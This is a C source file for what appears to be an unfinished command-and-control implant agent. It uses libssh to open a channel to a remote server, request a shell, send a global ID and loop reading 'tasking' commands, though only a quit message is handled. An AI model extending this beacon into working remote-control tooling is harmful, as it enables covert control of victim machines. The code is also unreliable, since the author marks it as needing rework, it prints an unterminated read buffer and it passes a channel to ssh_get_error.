#include "agent.h"

int func_loop(ssh_session session)
{
	/* Primary function loop */
	// Initialize vars
  	ssh_channel channel;
  	int rc;
  	char tasking[2048];
  	int nbytes;
	int quitting = 0;
  	channel = ssh_channel_new(session);

	printf("[+] Created new SSH channel\n");
  	if (channel == NULL)
    	return SSH_ERROR;

	// Open channel
  	rc = ssh_channel_open_session(channel);
	printf("[+] Opened SSH Channel with remote server\n");
  	if (rc != SSH_OK)
  	{
    	ssh_channel_free(channel);
    	return rc;
  	}

	// Request a shell interface
  	rc = ssh_channel_request_shell(channel);
	
	printf("[ ] Sent request for shell\n");
  	if (rc != SSH_OK)
  	{
    	ssh_channel_close(channel);
    	ssh_channel_free(channel);
    	return rc;
  	}
	printf("[+] Made it through check\n");

	// Begin the meat of the stuff


	// Send the global ID
	rc = ssh_channel_write(channel, GLOB_ID, strlen(GLOB_ID));

	printf("Wrote ID to channel\n");
		
	if (rc == SSH_ERROR){
		printf("caught ssh error: %s\n", ssh_get_error(channel));
		ssh_channel_close(channel);
    	ssh_channel_free(channel);
    	return rc;
	}


////// REWORK THIS STUFF DOESNT MAKE SENSE
	while (!quitting)
	{
		// reads data fromthe server
		nbytes = ssh_channel_read(channel, tasking, sizeof(tasking), 0);
		printf("read %d bytes from channel\n", nbytes);
		if (nbytes < 0){
			printf("Caught read error from server...\n");
    		ssh_channel_close(channel);
    		ssh_channel_free(channel);
    		return SSH_ERROR;
		}		

		printf("Read data: %s\n", tasking);
		quitting = parse_tasking(tasking, channel);
	}
	
  	// close connections
  	ssh_channel_send_eof(channel);
  	ssh_channel_close(channel);
  	ssh_channel_free(channel);
  	return SSH_OK;
}

int parse_tasking(char *tasking, ssh_channel chan){
	/* Parses and handles the tasking input from the server*/

	// checks if there is no tasking
	if(!strcmp(tasking, "NULL :)")){
		printf("No tasking available. Quitting...\n");
		ssh_channel_write(chan, "\0", 2);
		return 1;
	}
	return 0;
}